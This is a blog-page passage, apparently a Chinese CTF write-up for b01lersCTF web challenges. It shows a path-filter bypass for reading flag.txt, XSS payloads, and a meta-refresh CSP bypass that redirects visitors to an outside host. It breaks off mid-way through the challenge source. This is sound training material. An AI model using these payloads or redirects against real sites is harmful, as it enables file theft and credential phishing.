@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/03/18/security/ctf/b01lersctf/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="b01lersCTF">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/03/18/Security/CTF/b01lersCTF/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-18T13:59:00.000Z">
+<meta property="article:modified_time" content="2023-03-18T17:57:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            b01lersCTF -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail-1.png" alt="b01lersCTF" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">b01lersCTF</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-03-18 21:59</span>
+        <span class="mobile">2023-03-18 21:59</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-03-19 01:57</span>
+            <span class="mobile">2023-03-19 01:57</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="b01lersCTF"><a href="#b01lersCTF" class="headerlink" title="b01lersCTF"></a>b01lersCTF</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="warmUp"><a href="#warmUp" class="headerlink" title="warmUp"></a>warmUp</h3><p>进去后只有一个”HelloWorld”，F12查找信息发现 <code>debug.html</code> 文件，注意到该网址的路径都是base64编码过的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug.html -&gt; ZGVidWcuaHRtbA==</span><br></pre></td></tr></table></figure></div>
+
+<p>访问 <code>/ZGVidWcuaHRtbA==</code> 会得到提示：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testing rendering for flask app.py</span><br></pre></td></tr></table></figure></div>
+
+<p>这是一个flask模板的测试，源码文件是”app.py”，该文件也是可以访问的，b64编码：<code>YXBwLnB5</code> . 访问后得到源码：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode </span><br><span class="line"><span class="keyword">import</span> flask </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index2</span>(<span class="params">name</span>): </span><br><span class="line">    name = b64decode(name) </span><br><span class="line">    <span class="keyword">if</span> (validate(name)): </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This file is blocked!&quot;</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        file = <span class="built_in">open</span>(name, <span class="string">&#x27;r&#x27;</span>).read() </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File Not Found&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> file </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;/aW5kZXguaHRtbA==&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">data</span>): </span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&#x27;flag.txt&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
+
+<p>传入 <code>/</code> 后的路径都会被b64解码，所得到的字节流内容被拿来与 <code>b&#39;flag.txt&#39;</code> 进行比较，若相同则禁止访问。否则就读取该文件，若存在则将文件内容显示出来。</p>
+<p>显然题目源码的文件夹下有一个名为”flag.txt”的文件，我们需要绕过这个过滤读取到它。Linux严格区分大小写，因此大小写混淆不行，可以使用 <code>./flag.txt =&gt; Li9mbGFnLnR4dA==</code> 来读取到flag，文件路径匹配有很多写法，包括但不限于相对路径、省略的相对路径、绝对路径。</p>
+<h3 id="fishy-motd"><a href="#fishy-motd" class="headerlink" title="fishy-motd"></a>fishy-motd</h3><p><em>钓鱼的motd</em></p>
+<p>创建一条信息并共享出去，一眼XSS。可以在输入框中输入各种html标签，但由于源码中”public&#x2F;index.html”中有CSP保护：</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" >Content-Security-Policy的MDN文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> . 它规定了CSS只使用服务器来源的样式，其他的内联属性包括JavaScript等内容全部禁用（none即没有任何来源被允许），因此常规的标签全部失效，包括但不限于：</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>对于 <code>&lt;img/&gt;</code> 标签，可以在 <code>onerror</code> 中写 <code>this.src=&quot;newSrc for pics&quot;</code> 为其赋新的图片地址，该标签就会重新去访问该地址，利用这个可以做到页面跳转。</p>
+<p>为了绕过CSP的限制，参考：<a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/368865224" >CSP浅析与绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> . 使用</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1; url=http://0.0.0.0:7890/&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>“refresh”定义该标签会刷新页面，”content”表示延迟1秒后访问网址”url”，整个页面将被重定向至url。因此可以实现页面的跳转。</p>
+<p>查看题目源码：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fastify <span class="keyword">from</span> <span class="string">&#x27;fastify&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> fastifyFormbody <span class="keyword">from</span> <span class="string">&#x27;@fastify/formbody&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> fastifyStatic <span class="keyword">from</span> <span class="string">&#x27;@fastify/static&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; fileURLToPath &#125; <span class="keyword">from</span> <span class="string">&#x27;url&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> puppeteer <span class="keyword">from</span> <span class="string">&#x27;puppeteer&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; nanoid &#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> messages = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = <span class="title function_">fastify</span>();</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">register</span>(fastifyFormbody);</span><br><span class="line">server.<span class="title function_">register</span>(fastifyStatic, &#123;</span><br><span class="line">    <span class="attr">root</span>: path.<span class="title function_">join</span>(path.<span class="title function_">dirname</span>(<span class="title function_">fileURLToPath</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>)), <span class="string">&#x27;public&#x27;</span>),</span><br><span class="line">    <span class="attr">prefix</span>: <span class="string">&#x27;/public/&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;flag&#123;fake_flag&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">5000</span>;</span><br><span class="line"><span class="keyword">const</span> user = process.<span class="property">env</span>.<span class="property">ADMIN_USER</span> || <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> pass = process.<span class="property">env</span>.<span class="property">ADMIN_PASS</span> || <span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span 